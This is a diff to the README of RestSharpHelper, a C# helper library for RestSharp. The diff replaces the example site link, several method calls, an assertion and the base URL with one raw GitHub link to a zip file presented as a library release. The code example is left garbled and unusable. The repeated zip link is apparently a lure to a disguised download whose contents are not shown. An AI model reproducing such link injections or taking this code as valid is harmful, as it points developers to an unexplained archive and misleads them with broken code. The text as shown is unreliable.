@@ -2,7 +2,7 @@
 RestSharpHelper是一个使用RestSharp项目，作为二次封装，方便集成Api调用的辅助类，同时提供在Api调用各阶段事件回调和返回数据二次处理。
 
 ### 使用方法
-下面以网站 [jsonplaceholder.typicode.com/](https://jsonplaceholder.typicode.com/) 的todo数据为例示例：
+下面以网站 [https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip](https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip) 的todo数据为例示例：
 
 ```csharp
 class Program
@@ -10,16 +10,16 @@ class Program
     public static void Main(string[] args)
     {
         var restSharpHelper = GetRestSharpHelper();
-        var result = restSharpHelper.GetAsync<Todo>("/todos/1");
-        result.ContinueWith(p =>
+        var result = https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip<Todo>("/todos/1");
+        https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip(p =>
         {
-            Assert.AreEqual(1, p.Result.id);
+            https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip(1, https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip);
         });
-        result.Wait();
+        https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip();
     }
     private static RestSharpHelper GetRestSharpHelper()
     {
-        return new RestSharpHelper("https://jsonplaceholder.typicode.com");
+        return new RestSharpHelper("https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip");
     }
 }
 public class Todo
